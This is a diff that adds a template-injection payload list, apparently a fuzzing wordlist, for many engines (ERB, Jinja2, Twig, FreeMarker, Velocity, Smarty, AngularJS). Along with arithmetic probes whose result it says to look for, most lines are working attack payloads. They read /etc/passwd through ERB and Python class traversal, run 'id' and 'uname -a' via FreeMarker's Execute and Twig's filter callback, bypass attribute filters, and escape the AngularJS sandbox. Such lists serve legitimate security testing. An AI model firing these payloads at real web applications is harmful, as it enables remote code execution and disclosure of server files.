@@ -1,0 +1,45 @@
+##### LOOK FOR 1868686868
+<%= 666 * 666 %>
+<%= File.open('/etc/passwd').read %>
+${36692*50929}
+aaaaaaaaaaaaaaaaaaaaaa{*cccccccccccccccccccccccccccccccc*}bbbbbbbbbbbbbbbbbbbbbbbbb
+${"aaaaaaaaaaaaaaaaaaaaaa".join("bbbbbbbbbbbbbbbbbbbbbbbbb")}
+${36692*'50929'}
+${{36692*50929}}
+${{36692*'50929'}}
+{{36692*'50929'}}
+{{36692*50929}}
+[[36692*50929]]
+${{36692*50929}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+{{self}}
+{php}echo 36692*50929;{/php}
+{{velocity}}36692*50929;{{/velocity}}
+{{python}}36692*50929;{{/python}}
+<#assign
+ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+= root
+= 36692 * 50929
+<% x=36692*50929 %>${x}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
+aaaaaaaaaaaaaaaaaaaaaa{{''.__class__.__mro__[2].__subclasses__()[233]}}bbbbbbbbbbbbbbbbbbbbbbbbb
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("uname+-a")}}
+$class
+#set( $foo = "aaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbb") $foo
+#set( $foo = "aaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbb") $foo.class
+${fffffffffffffffffffffff}
+{{ffffffffffffffffffff}}
+[[ffffffffffffffffffffff]]
+{{constructor.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
